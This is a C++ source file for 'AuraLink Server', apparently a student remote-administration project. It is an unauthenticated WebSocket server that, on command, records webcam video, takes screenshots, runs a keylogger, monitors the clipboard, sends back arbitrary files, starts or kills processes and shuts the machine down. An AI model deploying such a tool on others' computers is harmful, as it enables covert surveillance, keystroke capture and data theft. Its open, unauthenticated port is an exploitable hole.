// --- CAU HINH WINDOWS ---
#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0A00 
#endif

#include <boost/beast/core.hpp>
#include <boost/beast/websocket.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/strand.hpp>
#include <cstdlib>      
#include <iostream>
#include <string>
#include <thread>
#include <memory>
#include <vector>
#include <fstream>
#include <windows.h>   
#include <iphlpapi.h>
#include <atomic> 
#include <iomanip>

// Cac module chuc nang
#include "Process.h"
#include "Keylogger.h"
#include "Webcam.h"
#include "Application.h"
#include "ScreenShot.h"
#include "TextToSpeech.h"
#include "Clipboard.h"
#include "FileTransfer.h"
// Link thu vien Windows
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib") 
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "psapi.lib")

extern "C" __declspec(dllimport) BOOL __stdcall SetProcessDPIAware();

namespace beast = boost::beast;
namespace http = beast::http;
namespace websocket = beast::websocket;
namespace net = boost::asio;
using tcp = boost::asio::ip::tcp;

// =============================================================
// PHAN 1: CAC HAM HO TRO (LIVE STATUS & RESOURCES)
// =============================================================

static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string base64_encode(const std::vector<char>& data) {
    std::string ret;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];
    size_t dataLen = data.size();
    size_t dataPos = 0;
    while (dataLen--) {
        char_array_3[i++] = data[dataPos++];
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (i = 0; (i < 4); i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while ((i++ < 3)) ret += '=';
    }
    return ret;
}

std::string GetComputerNameStr() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) return std::string(buffer);
    return "Unknown-PC";
}

std::string GetOSVersionStr() {
    std::string osName = "Unknown Windows";
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char productName[255] = { 0 };
        DWORD dataSize = sizeof(productName);
        if (RegQueryValueExA(hKey, "ProductName", nullptr, nullptr, (LPBYTE)productName, &dataSize) == ERROR_SUCCESS) {
            osName = std::string(productName);
        }

        char currentBuild[32] = { 0 };
        dataSize = sizeof(currentBuild);
        if (RegQueryValueExA(hKey, "CurrentBuild", nullptr, nullptr, (LPBYTE)currentBuild, &dataSize) == ERROR_SUCCESS) {
            int buildNumber = std::atoi(currentBuild);
            // Windows 11 bat dau tu build 22000
            if (buildNumber >= 22000) {
                // Thay the chu "Windows 10" thanh "Windows 11" neu co
                size_t pos = osName.find("Windows 10");
                if (pos != std::string::npos) {
                    osName.replace(pos, 10, "Windows 11");
                }
                else if (osName.find("Windows 11") == std::string::npos) {
                    // Neu khong tim thay chu Windows 10, them Windows 11 vao
                    osName = "Windows 11 " + osName;
                }
            }
        }
        RegCloseKey(hKey);
    }
    return osName;
}

std::string GetRamFree() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    double freeGB = (double)statex.ullAvailPhys / (1024 * 1024 * 1024);
    std::stringstream ss;
    ss << std::fixed << std::setprecision(1) << freeGB << " GB";
    return ss.str();
}

std::string GetRamUsagePercent() {
    MEMORYSTATUSEX statex;
    statex.dwLength = sizeof(statex);
    GlobalMemoryStatusEx(&statex);
    return std::to_string((int)statex.dwMemoryLoad);
}

std::string GetDiskFree() {
    ULARGE_INTEGER freeBytes, totalBytes, totalFree;
    if (GetDiskFreeSpaceExA("C:\\", &freeBytes, &totalBytes, &totalFree)) {
        double freeGB = (double)freeBytes.QuadPart / (1024 * 1024 * 1024);
        std::stringstream ss;
        ss << std::fixed << std::setprecision(0) << freeGB << " GB";
        return ss.str();
    }
    return "Unknown";
}

std::string GetProcessCount() {
    DWORD count = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do { count++; } while (Process32Next(hSnap, &pe32));
        }
        CloseHandle(hSnap);
    }
    return std::to_string(count);
}

std::string GetCpuUsage() {
    FILETIME idleTime, kernelTime, userTime;
    if (!GetSystemTimes(&idleTime, &kernelTime, &userTime)) return "0";

    static unsigned long long prevTotal = 0;
    static unsigned long long prevIdle = 0;

    unsigned long long total =
        ((unsigned long long)kernelTime.dwHighDateTime << 32 | kernelTime.dwLowDateTime) +
        ((unsigned long long)userTime.dwHighDateTime << 32 | userTime.dwLowDateTime);

    unsigned long long idle =
        ((unsigned long long)idleTime.dwHighDateTime << 32 | idleTime.dwLowDateTime);

    unsigned long long diffTotal = total - prevTotal;
    unsigned long long diffIdle = idle - prevIdle;

    // Cap nhat lai trang thai cu
    prevTotal = total;
    prevIdle = idle;

    if (diffTotal == 0) return "0";

    double usage = (100.0 * (diffTotal - diffIdle)) / diffTotal;

    // Gioi han 0-100
    if (usage < 0) usage = 0;
    if (usage > 100) usage = 100;

    return std::to_string((int)usage);
}

std::string GetBatteryStatus() {
    SYSTEM_POWER_STATUS sps;
    if (GetSystemPowerStatus(&sps)) {
        if (sps.BatteryLifePercent == 255) return "Plugged In";
        return std::to_string(sps.BatteryLifePercent) + "%";
    }
    return "Unknown";
}

void PrintLocalIPs() {
    ULONG outBufLen = 15000;
    PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(outBufLen);
    if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &outBufLen) == NO_ERROR) {
        PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses;
        while (pCurrAddresses) {
            if (pCurrAddresses->OperStatus == IfOperStatusUp && pCurrAddresses->IfType != IF_TYPE_SOFTWARE_LOOPBACK) {
                PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pCurrAddresses->FirstUnicastAddress;
                if (pUnicast) {
                    char ip[INET_ADDRSTRLEN];
                    sockaddr_in* sa_in = (sockaddr_in*)pUnicast->Address.lpSockaddr;
                    inet_ntop(AF_INET, &(sa_in->sin_addr), ip, INET_ADDRSTRLEN);
                    std::string ipStr(ip);
                    if (ipStr.find("192.168.") == 0 || ipStr.find("10.") == 0 || ipStr.find("172.") == 0) {
                        std::cout << ">>> YOUR SERVER IP: " << ipStr << " <<<\n";
                    }
                }
            }
            pCurrAddresses = pCurrAddresses->Next;
        }
    }
    free(pAddresses);
}

void DoShutdown();
void DoRestart();
std::thread g_webcamThread;
void fail(beast::error_code ec, char const* what) { std::cerr << what << ": " << ec.message() << "\n"; }

// =============================================================
// PHAN 2: XU LY KET NOI (SESSION)
// =============================================================

class session : public std::enable_shared_from_this<session> {
    websocket::stream<beast::tcp_stream> ws_;
    beast::flat_buffer buffer_;
public:
    explicit session(tcp::socket&& socket) : ws_(std::move(socket)) {}
    void run() {
        ws_.set_option(websocket::stream_base::timeout::suggested(beast::role_type::server));
        ws_.async_accept(beast::bind_front_handler(&session::on_accept, shared_from_this()));
    }
    void on_accept(beast::error_code ec) { if (ec) return fail(ec, "Accept Error"); do_read(); }
    void do_read() { ws_.async_read(buffer_, beast::bind_front_handler(&session::on_read, shared_from_this())); }

    void on_read(beast::error_code ec, std::size_t bytes_transferred) {
        boost::ignore_unused(bytes_transferred);
        if (ec == websocket::error::closed) return;
        if (ec) return fail(ec, "Read Error");

        if (ws_.got_text()) {
            std::string command = beast::buffers_to_string(buffer_.data());

            static Keylogger myKeylogger;
            static Process myProcessModule;
            static Application myAppModule;
            static Clipboard myClipboard;
            // ---------------------------------------------------------
            // [SECTION 1] SYSTEM INFO, PING, POWER
            // ---------------------------------------------------------
            if (command == "get-sys-info") {
                std::string hostname = GetComputerNameStr();
                std::string os = GetOSVersionStr();

                std::string ramFree = GetRamFree();
                std::string battery = GetBatteryStatus();
                std::string diskFree = GetDiskFree();
                std::string procCount = GetProcessCount();

                std::string cpuUsage = GetCpuUsage();
                std::string ramUsage = GetRamUsagePercent();

                // Format: sys-info Host|OS|RAMFree|Battery|DiskFree|ProcessCount|CPU%|RAM%
                std::string response = "sys-info " + hostname + "|" + os + "|" + ramFree + "|" + battery + "|" + diskFree + "|" + procCount + "|" + cpuUsage + "|" + ramUsage;

                ws_.text(true);
                ws_.write(net::buffer(response));
            }
            else if (command == "ping") {
                ws_.text(true); ws_.write(net::buffer("pong"));
            }
            else if (command == "shutdown") {
                ws_.text(true); ws_.write(net::buffer("Server: OK, shutting down in 15s...")); DoShutdown();
            }
            else if (command == "restart") {
                ws_.text(true); ws_.write(net::buffer("Server: OK, restarting in 15s...")); DoRestart();
            }

            // ---------------------------------------------------------
            // [SECTION 2] MEDIA (WEBCAM & SCREENSHOT)
            // ---------------------------------------------------------
            else if (command == "capture") {
                if (g_webcamThread.joinable()) {
                    ws_.text(true); ws_.write(net::buffer("Server: Busy recording..."));
                }
                else {
                    ws_.text(true); ws_.write(net::buffer("Server: Started recording..."));
                    auto self = shared_from_this();
                    g_webcamThread = std::thread([self]() {
                        std::vector<char> videoData = CaptureWebcam(10);
                        if (!videoData.empty()) {
                            std::string encoded = base64_encode(videoData);
                            try { self->ws_.text(true); self->ws_.write(net::buffer("file " + encoded)); }
                            catch (...) {}
                        }
                        });
                    g_webcamThread.detach();
                }
            }
            else if (command == "screenshot") {
                ws_.text(true); ws_.write(net::buffer("Server: OK, capturing screenshot..."));
                int width = GetSystemMetrics(SM_CXSCREEN);
                int height = GetSystemMetrics(SM_CYSCREEN);
                std::vector<std::uint8_t> pixels = ScreenShot();
                if (pixels.empty()) {
                    ws_.text(true); ws_.write(net::buffer("Server: Error capturing screenshot."));
                }
                else {
                    std::vector<char> bytes(pixels.begin(), pixels.end());
                    std::string encoded = base64_encode(bytes);
                    std::string response = "screenshot " + std::to_string(width) + " " + std::to_string(height) + " " + encoded;
                    ws_.text(true); ws_.write(net::buffer(response));
                }
            }

            // ---------------------------------------------------------
            // [SECTION 3] KEYLOGGER
            // ---------------------------------------------------------
            else if (command == "start-keylog") { myKeylogger.StartKeyLogging(); ws_.text(true); ws_.write(net::buffer("Server: Keylogger started (background)...")); }
            else if (command == "stop-keylog") { myKeylogger.StopKeyLogging(); ws_.text(true); ws_.write(net::buffer("Server: Keylogger stopped.")); }
            else if (command == "get-keylog") {
                std::string logs = myKeylogger.GetLoggedKeys();
                // Không cần check empty vì hàm GetLoggedKeys luôn trả về header MODE:...

                // Gửi trực tiếp logs (đã có sẵn header MODE:...) để Client tự tách
                ws_.text(true); ws_.write(net::buffer(logs));
            }

            // ---------------------------------------------------------
            // [SECTION 4] PROCESS MANAGEMENT
            // ---------------------------------------------------------
            else if (command == "ps") {
                std::string list = myProcessModule.ListProcesses();
                ws_.text(true); ws_.write(net::buffer(list));
            }
            else if (command.rfind("start ", 0) == 0) {
                std::string appName = command.substr(6);
                if (myProcessModule.StartProcess(appName)) {
                    ws_.text(true); ws_.write(net::buffer("Server: Started successfully: " + appName));
                }
                else {
                    ws_.text(true); ws_.write(net::buffer("Server: Error! Could not start: " + appName));
                }
            }
            else if (command.rfind("kill ", 0) == 0) {
                std::string target = command.substr(5);
                std::string result = myProcessModule.StopProcess(target);
                ws_.text(true); ws_.write(net::buffer("Server: " + result));
            }

            // ---------------------------------------------------------
            // [SECTION 5] APPLICATION MANAGEMENT
            // ---------------------------------------------------------
            else if (command == "list-app") {
                myAppModule.LoadInstalledApps();

                auto apps = myAppModule.ListApplicationsWithStatus();
                ws_.text(true);
                if (apps.empty()) ws_.write(net::buffer("Server: No apps found in Registry."));
                else {
                    std::string msg = "DANH SACH UNG DUNG\n";

                    for (size_t i = 0; i < apps.size(); ++i) {
                        msg += "[" + std::to_string(i) + "] " + apps[i].first.name + (apps[i].second ? " (RUNNING)" : "") + "\n";
                        msg += "Exe: " + apps[i].first.path + "\n";
                    }
                    ws_.write(net::buffer(msg));
                }
            }
            else if (command.rfind("start-app ", 0) == 0) {
                std::string input = command.substr(10);
                bool ok = myAppModule.StartApplication(input);
                ws_.text(true); ws_.write(net::buffer(ok ? "Server: Started " + input : "Server: Failed " + input));
            }
            else if (command.rfind("stop-app ", 0) == 0) {
                std::string input = command.substr(9);
                bool ok = myAppModule.StopApplication(input);
                ws_.text(true); ws_.write(net::buffer(ok ? "Server: Stopped " + input : "Server: Failed stop " + input));
            }
            // ---------------------------------------------------------
            // [SECTION 6] TEXT TO SPEECH (VUI NHON)
            // ---------------------------------------------------------
            else if (command.rfind("tts ", 0) == 0) {
                // Cu phap: tts Hello Teacher
                std::string textToSpeak = command.substr(4); // Cat bo chu "tts "

                static TextToSpeech myTTS; // Khoi tao static de dung chung
                myTTS.Speak(textToSpeak);

                ws_.text(true);
                ws_.write(net::buffer("Server: OK, speaking: \"" + textToSpeak + "\""));
            }
            // ---------------------------------------------------------
            // [SECTION 7] CLIPBOARD MONITOR (THEO DÕI COPY/PASTE)
            // ---------------------------------------------------------
            else if (command == "start-clip") {
                myClipboard.StartMonitoring();
                ws_.text(true);
                ws_.write(net::buffer("Server: Clipboard Monitor STARTED (Background)..."));
            }
            else if (command == "stop-clip") {
                myClipboard.StopMonitoring();
                ws_.text(true);
                ws_.write(net::buffer("Server: Clipboard Monitor STOPPED."));
            }
            else if (command == "get-clip") {
                std::string logs = myClipboard.GetLogs();
                if (logs.empty()) logs = "[No clipboard data recorded]";

                // Gửi dữ liệu về Client
                ws_.text(true);
                ws_.write(net::buffer("CLIPBOARD_DATA:\n" + logs));
            }
            // ---------------------------------------------------------
            // [SECTION 8] FILE TRANSFER (DOWNLOAD FILE) 
            // ---------------------------------------------------------
            else if (command.rfind("download-file ", 0) == 0) {
                std::string filepath = command.substr(14);

                filepath.erase(0, filepath.find_first_not_of(" \n\r\t"));
                filepath.erase(filepath.find_last_not_of(" \n\r\t") + 1);

                std::string response = FileTransfer::HandleDownloadRequest(filepath);

                ws_.text(true);
                ws_.write(net::buffer(response));

                if (response.find("FILE_DOWNLOAD") == 0) {
                    std::cout << "File sent successfully: " << filepath << "\n";
                }
                else {
                    std::cout << "File send failed: " << filepath << "\n";
                }
            }
            else if (command.rfind("ls ", 0) == 0) {
                // Lệnh: ls <đường dẫn> (Ví dụ: ls D:\Data)
                std::string path = command.substr(3);
                std::string result = FileTransfer::ListDirectory(path);
                ws_.text(true);
                ws_.write(net::buffer(result));
            }
            else if (command == "ls") {
                // Lệnh: ls (Mặc định lấy ổ C)
                std::string result = FileTransfer::ListDirectory("C:\\");
                ws_.text(true);
                ws_.write(net::buffer(result));
            }
        }
        buffer_.consume(buffer_.size());
        do_read();
    }
};

class listener : public std::enable_shared_from_this<listener> {
    net::io_context& ioc_;
    tcp::acceptor acceptor_;
public:
    listener(net::io_context& ioc, tcp::endpoint endpoint) : ioc_(ioc), acceptor_(ioc) {
        beast::error_code ec;
        acceptor_.open(endpoint.protocol(), ec);
        if (ec) { fail(ec, "Open Error"); return; }
        acceptor_.set_option(net::socket_base::reuse_address(true), ec);
        if (ec) { fail(ec, "Set Option Error"); return; }
        acceptor_.bind(endpoint, ec);
        if (ec) { fail(ec, "Bind Error"); return; }
        acceptor_.listen(net::socket_base::max_listen_connections, ec);
        if (ec) { fail(ec, "Listen Error"); return; }
    }
    void run() { do_accept(); }
private:
    void do_accept() { acceptor_.async_accept(net::make_strand(ioc_), beast::bind_front_handler(&listener::on_accept, shared_from_this())); }
    void on_accept(beast::error_code ec, tcp::socket socket) {
        if (ec) fail(ec, "Accept Error");
        else std::make_shared<session>(std::move(socket))->run();
        do_accept();
    }
};

int main() {
    SetProcessDPIAware();

    auto const address = net::ip::make_address("0.0.0.0");
    auto const port = static_cast<unsigned short>(8080);
    int const threads = 1;

    std::cout << "Starting AuraLink Server...\n";
    PrintLocalIPs();
    std::cout << "Listening on ws://" << address.to_string() << ":" << port << "\n";
    std::cout << "----------------------------------\n";

    net::io_context ioc{ threads };
    std::make_shared<listener>(ioc, tcp::endpoint{ address, port })->run();
    ioc.run();

    return EXIT_SUCCESS;
}